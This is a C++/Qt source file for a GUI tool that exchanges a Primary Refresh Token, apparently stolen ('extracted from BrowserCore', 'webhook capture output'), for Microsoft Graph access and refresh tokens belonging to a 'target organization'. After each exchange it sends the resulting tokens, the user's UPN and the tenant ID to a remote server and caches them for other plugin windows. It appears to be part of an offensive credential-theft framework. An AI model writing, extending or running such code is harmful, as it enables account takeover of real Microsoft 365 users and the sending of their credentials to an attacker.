#include "PRTTokenUI.h"
#include "ClientIdSelector.h"
#include "TokenStore.h"
#include "../shared/Protocol.h"
#include <QRegularExpression>
#include <QDebug>
#include <QJsonDocument>
#include <QUuid>
#include <QApplication>

PRTTokenUI::PRTTokenUI(QWidget *parent) : QWidget(parent) {
    setWindowTitle("PRT Token to Access Token");
    setMinimumWidth(600);
    setMinimumHeight(500);

    auto *layout = new QVBoxLayout(this);

    // Add instructions
    auto *instructions = new QLabel(
        "<b>Instructions:</b><br>"
        "1. Paste the PRT token extracted from BrowserCore<br>"
        "2. <b style='color: #ffaa00;'>Enter the Tenant ID or Domain from the target organization</b><br>"
        "3. Use default Client ID (Microsoft Teams) or try others<br>"
        "4. Click 'Exchange Token' to get access & refresh tokens<br><br>"
        "<b style='color: #ff5555;'>IMPORTANT:</b> PRT tokens are tenant-specific. Use the tenant ID from the token payload!"
    );
    instructions->setWordWrap(true);
    instructions->setStyleSheet("background-color: #2d2d30; padding: 10px; border-radius: 5px;");
    layout->addWidget(instructions);

    tenant = new QLineEdit();
    tenant->setPlaceholderText("Tenant ID (e.g., 12345678-1234-1234-1234-123456789012) or domain (e.g., contoso.com)");
    layout->addWidget(new QLabel("Tenant (REQUIRED):"));
    layout->addWidget(tenant);

    // Microsoft Teams - reliable default for PRT exchange
    clientId = new ClientIdSelector(this, "1fec8e78-bce4-4aaf-ab1b-5451cc387264");
    layout->addWidget(new QLabel("Client ID (choose from list or paste your own):"));
    layout->addWidget(clientId);

    resource = new QLineEdit();
    resource->setText("https://graph.microsoft.com/");
    layout->addWidget(new QLabel("Resource:"));
    layout->addWidget(resource);

    prtToken = new QTextEdit();
    prtToken->setPlaceholderText("Paste PRT Cookie/Token here (single line or multi-line)");
    prtToken->setMinimumHeight(100);
    layout->addWidget(new QLabel("PRT Token:"));
    layout->addWidget(prtToken);

    QPushButton *btn = new QPushButton("Exchange Token");
    connect(btn, &QPushButton::clicked, this, &PRTTokenUI::performExchange);
    layout->addWidget(btn);

    output = new QTextEdit();
    output->setReadOnly(true);
    layout->addWidget(output);
}

void PRTTokenUI::performExchange() {
    // Validate tenant is provided
    QString tenantValue = tenant->text().trimmed();
    if (tenantValue.isEmpty()) {
        QMessageBox::critical(this, "Missing Tenant",
            "Tenant ID or domain is required!\n\n"
            "PRT tokens are tenant-specific. You must provide the tenant ID or domain.\n\n"
            "To find your tenant:\n"
            "1. Check the webhook capture output for 'Tenant ID'\n"
            "2. Or run: python3 extract_prt_tenant.py\n"
            "3. Or decode the PRT token JWT payload");
        return;
    }

    // Get raw input and split by newlines to handle multiple tokens
    QString rawInput = prtToken->toPlainText();
    QStringList lines = rawInput.split(QRegularExpression("[\\r\\n]+"), Qt::SkipEmptyParts);

    // Look for the RS256 device assertion JWT (the one needed for x-ms-RefreshTokenCredential)
    // It has "alg":"RS256" and "typ":"JWT" and "x5c" certificate chain
    QString cleanedPrtToken;
    for (const QString &line : lines) {
        QString trimmed = line.trimmed();
        if (!trimmed.startsWith("eyJ")) continue;

        // Try to decode header to check if this is the RS256 assertion
        QStringList parts = trimmed.split('.');
        if (parts.size() >= 2) {
            QByteArray headerB64 = parts[0].toUtf8();
            // Pad to valid base64
            int pad = (4 - (headerB64.size() % 4)) % 4;
            headerB64.append(QByteArray(pad, '='));
            QByteArray headerJson = QByteArray::fromBase64(headerB64, QByteArray::Base64UrlEncoding);

            // Check for RS256 with x5c (device assertion) - this is what we need
            if (headerJson.contains("RS256") && headerJson.contains("x5c")) {
                cleanedPrtToken = trimmed;
                qDebug() << "[PRTTokenUI] Found RS256 device assertion JWT";
                break;
            }
            // If we haven't found RS256 yet, keep looking but save HS256 as fallback
            if (cleanedPrtToken.isEmpty() && headerJson.contains("HS256")) {
                // This is the HS256 token with refresh_token - not what we need for SSO
                qDebug() << "[PRTTokenUI] Found HS256 token (not the device assertion)";
            }
        }
    }

    // If no RS256 found, try cleaning the entire input as single token
    if (cleanedPrtToken.isEmpty()) {
        cleanedPrtToken = rawInput;
        cleanedPrtToken = cleanedPrtToken.replace(QRegularExpression("[\\r\\n\\t\\s]"), "");

        // Check if concatenated tokens - look for eyJ appearing twice
        int secondEyJ = cleanedPrtToken.indexOf("eyJ", 4);
        if (secondEyJ > 0) {
            // Likely concatenated - try to extract the RS256 one
            QString secondToken = cleanedPrtToken.mid(secondEyJ);
            QStringList parts = secondToken.split('.');
            if (parts.size() >= 2) {
                QByteArray headerB64 = parts[0].toUtf8();
                int pad = (4 - (headerB64.size() % 4)) % 4;
                headerB64.append(QByteArray(pad, '='));
                QByteArray headerJson = QByteArray::fromBase64(headerB64, QByteArray::Base64UrlEncoding);
                if (headerJson.contains("RS256") && headerJson.contains("x5c")) {
                    cleanedPrtToken = secondToken;
                    qDebug() << "[PRTTokenUI] Extracted RS256 device assertion from concatenated tokens";
                }
            }
        }
    }

    if (cleanedPrtToken.isEmpty()) {
        QMessageBox::warning(this, "Error", "PRT Token is empty. Please paste a valid PRT token.");
        return;
    }

    if (!cleanedPrtToken.startsWith("eyJ")) {
        if (QMessageBox::warning(this, "Warning",
            "PRT token should start with 'eyJ' (JWT format).\n\n"
            "Current token starts with: " + cleanedPrtToken.left(20) + "\n\n"
            "Are you sure this is a valid PRT token?",
            QMessageBox::Yes | QMessageBox::No) == QMessageBox::No) {
            return;
        }
    }

    qDebug() << "[PRTTokenUI] Original token length:" << rawInput.length();
    qDebug() << "[PRTTokenUI] Cleaned token length:" << cleanedPrtToken.length();

    const QString effectiveClientId = clientId->currentClientId();
    if (effectiveClientId.isEmpty()) {
        QMessageBox::warning(this, "Missing Client ID",
            "Select a well-known client ID from the dropdown, "
            "or paste a valid GUID.");
        return;
    }

    auto *ex = new PRTTokenExchanger(
        effectiveClientId,
        tenant->text().trimmed(),
        resource->text().trimmed(),
        cleanedPrtToken,
        this
    );
    connect(ex, &PRTTokenExchanger::exchangeFinished, this, &PRTTokenUI::handleResult);
    connect(ex, &PRTTokenExchanger::errorOccurred, this, &PRTTokenUI::handleError);
    ex->getAccessToken();
}

void PRTTokenUI::handleResult(const QJsonObject &obj) {
    QString accessToken = obj.value("access_token").toString();
    QString refreshToken = obj.value("refresh_token").toString();

    QString result = QString("Access Token:\n%1\n\nRefresh Token:\n%2")
                         .arg(accessToken.isEmpty() ? "N/A" : accessToken,
                              refreshToken.isEmpty() ? "N/A" : refreshToken);
    output->setPlainText(result);

    // Log token to server database
    logTokenToServer(accessToken, refreshToken);
}

void PRTTokenUI::handleError(const QString &err) {
    QMessageBox::critical(this, "Error", err);
}

void PRTTokenUI::logTokenToServer(const QString &accessToken, const QString &refreshToken) {
    if (accessToken.isEmpty()) {
        return; // Nothing to log
    }

    QObject *transportObj = locateTransport();
    if (!transportObj) {
        qWarning() << "[PRTTokenUI] Cannot log token: no transport found";
        return;
    }

    // Generate a unique session ID for PRT exchange
    QString sessionId = QString("prt_exchange_%1").arg(QUuid::createUuid().toString(QUuid::WithoutBraces));

    // Extract claims from JWT for proper logging
    QString upn = b64UrlDecodeToJsonField(accessToken, "upn");
    if (upn.isEmpty()) {
        upn = b64UrlDecodeToJsonField(accessToken, "preferred_username");
    }
    if (upn.isEmpty()) {
        upn = b64UrlDecodeToJsonField(accessToken, "unique_name");
    }
    QString tenantId = b64UrlDecodeToJsonField(accessToken, "tid");
    QString resourceVal = b64UrlDecodeToJsonField(accessToken, "aud");

    // Use configured resource if available
    if (resource && !resource->text().trimmed().isEmpty()) {
        resourceVal = resource->text().trimmed();
    }

    QJsonObject req;
    req.insert(Protocol::F_ACTION, Protocol::ACTION_LOG_TOKEN);
    req.insert("sessionId", sessionId);
    req.insert("source", "prt_token_exchange");
    req.insert("accessToken", accessToken);
    if (!refreshToken.isEmpty())
        req.insert("refreshToken", refreshToken);
    if (!upn.isEmpty())
        req.insert("user", upn);
    if (!tenantId.isEmpty())
        req.insert("tenantId", tenantId);
    if (!resourceVal.isEmpty())
        req.insert("resource", resourceVal);

    // Send to server
    QMetaObject::invokeMethod(transportObj, "sendJson", Q_ARG(QJsonObject, req));

    // Mirror into TokenStore so this token is immediately visible to every
    // plugin window's UserSelectorWidget without needing a reconnect.
    TokenInfo tokenInfo;
    tokenInfo.accessToken  = accessToken;
    tokenInfo.refreshToken = refreshToken;
    tokenInfo.upn          = upn;
    tokenInfo.tenantId     = tenantId;
    tokenInfo.resource     = resourceVal;
    TokenStore::instance()->storeToken(sessionId, tokenInfo);

    qInfo() << "[PRTTokenUI] Token logged to server | User:" << upn << "| Tenant:" << tenantId;
}

QString PRTTokenUI::b64UrlDecodeToJsonField(const QString &jwtToken, const QString &field) {
    const QStringList parts = jwtToken.split('.');
    if (parts.size() < 2) return QString();

    QByteArray payload = parts.at(1).toUtf8();
    int pad = (4 - (payload.size() % 4)) % 4;
    payload.append(QByteArray(pad, '='));

    QByteArray decoded = QByteArray::fromBase64(payload, QByteArray::Base64UrlEncoding);
    if (decoded.isEmpty()) return QString();

    QJsonParseError parseError;
    QJsonDocument doc = QJsonDocument::fromJson(decoded, &parseError);
    if (parseError.error != QJsonParseError::NoError || !doc.isObject()) return QString();

    return doc.object().value(field).toString();
}

QObject* PRTTokenUI::locateTransport() {
    // Try to find ClientTransport in the application
    QObject *found = qApp->findChild<QObject*>("ClientTransport", Qt::FindChildrenRecursively);
    if (!found) {
        // Brute-force scan for ClientTransport
        const auto objs = qApp->findChildren<QObject*>();
        for (QObject* o : objs) {
            const char* cn = o->metaObject() ? o->metaObject()->className() : nullptr;
            if (cn && QByteArray(cn).contains("ClientTransport")) {
                found = o;
                break;
            }
        }
    }
    return found;
}
